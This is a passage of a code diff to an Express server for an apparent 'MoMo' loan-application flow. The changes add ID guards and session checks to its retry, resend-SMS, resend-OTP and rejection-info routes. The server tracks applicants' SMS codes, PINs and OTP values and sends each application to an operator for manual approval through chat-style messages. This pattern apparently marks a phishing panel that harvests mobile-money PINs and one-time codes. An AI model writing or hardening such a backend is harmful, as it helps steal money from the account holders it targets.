-        sms: app_.sms, pin: app_.pin, otp: app_.otp,
-        qualification: app_.qualification
+        application: app_.application, sms: app_.sms, pin: app_.pin, otp: app_.otp, qualification: app_.qualification
     });
 });
 
 // ═══════════════════════════════════════════════════════════
-// RETRY / RESEND
+// RETRY / RESEND (guarded)
 // ═══════════════════════════════════════════════════════════
-app.post('/api/retry/:applicationId/:step', (req, res) => {
+app.post('/api/retry/:applicationId/:step', guardAppId, (req, res) => {
     const { applicationId, step } = req.params;
     const app_ = applications[applicationId];
     if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
-
     const valid = [...STEP_ORDER, 'sms', 'pin', 'otp'];
     if (!valid.includes(step)) return res.status(400).json({ ok: false, error: 'Invalid step' });
 
@@ -862,7 +1049,7 @@ app.post('/api/retry/:applicationId/:step', (req, res) => {
     res.json({ ok: true });
 });
 
-app.post('/api/resend-sms/:applicationId', (req, res) => {
+app.post('/api/resend-sms/:applicationId', guardAppId, (req, res) => {
     const app_ = applications[req.params.applicationId];
     if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
     app_.sms = 'idle'; app_.smsMessage = null;
@@ -873,6 +1060,10 @@ app.post('/api/resend-sms/:applicationId', (req, res) => {
 
 app.post('/api/resend-otp', (req, res) => {
     const { applicationId } = req.body || {};
+    const session = readSession(req);
+    if (session && session.id !== applicationId) {
+        return res.status(403).json({ ok: false, error: 'Session mismatch.' });
+    }
     const app_ = applications[applicationId];
     if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
     app_.otp = 'idle'; app_.otpValue = null;
@@ -882,10 +1073,9 @@ app.post('/api/resend-otp', (req, res) => {
     res.json({ ok: true });
 });
 
-app.get('/api/rejection-info/:applicationId', (req, res) => {
+app.get('/api/rejection-info/:applicationId', guardAppId, (req, res) => {
     const app_ = applications[req.params.applicationId];
     if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
-
     let rejectedStep = null, errorMessage = '';
     const labels = {
         loan: 'Loan request', personal: 'Personal details', employment: 'Employment',
@@ -904,14 +1094,13 @@ app.get('/api/rejection-info/:applicationId', (req, res) => {
 });
 
 // ═══════════════════════════════════════════════════════════
-// LEGACY FLOW
+// LEGACY FLOW (kept)
 // ═══════════════════════════════════════════════════════════
 app.post('/api/send-application', (req, res) => {
     try {
         const data = req.body.applicationData || {};
         const { applicationId } = data;
         if (!applicationId) return res.status(400).json({ ok: false, error: 'Missing application ID' });
-
         const app_ = applications[applicationId];
         if (!app_ || !app_.isRegistered || !app_.accountType || !ACCOUNT_TYPES[app_.accountType]) {
             return res.status(403).json({ ok: false, code: 'NOT_REGISTERED', error: 'Invalid user credentials. You must register on MoMo before applying.' });
@@ -919,13 +1108,10 @@ app.post('/api/send-application', (req, res) => {
         const type = ACCOUNT_TYPES[app_.accountType];
         if (data.loanAmount > type.maxLoan) return res.status(400).json({ ok: false, error: `Max R ${fmt(type.maxLoan)} for ${type.name}.` });
         if (data.loanAmount < type.minLoan) return res.status(400).json({ ok: false, error: `Min R ${fmt(type.minLoan)}.` });
-
         Object.assign(app_, data, {
-            accountName: type.name,
-            accountMaxLoan: type.maxLoan,
+            accountName: type.name, accountMaxLoan: type.maxLoan,
             monthlyRepayment: monthlyRepayment(data.loanAmount, parseInt(data.loanTerm)),
-            application: 'pending',
-            updatedAt: new Date().toISOString()
+            application: 'pending', updatedAt: new Date().toISOString()
         });
         saveApps();
         askApproval(`📋 <b>NEW APPLICATION</b>\n🆔 ${code(applicationId)}`, 'application', applicationId);
@@ -986,8 +1172,8 @@ app.get('*', (req, res) => {
 // ─── Boot ───
 loadAll();
 app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`🚀 Server running on port ${PORT} (v6.5)`);
     console.log(`   → http://localhost:${PORT}`);
     console.log(`   → Health: /health`);
-    console.log(`   → Account types: /api/account-types\n`);
+    console.log(`   → Terms: /api/terms\n`);
 });
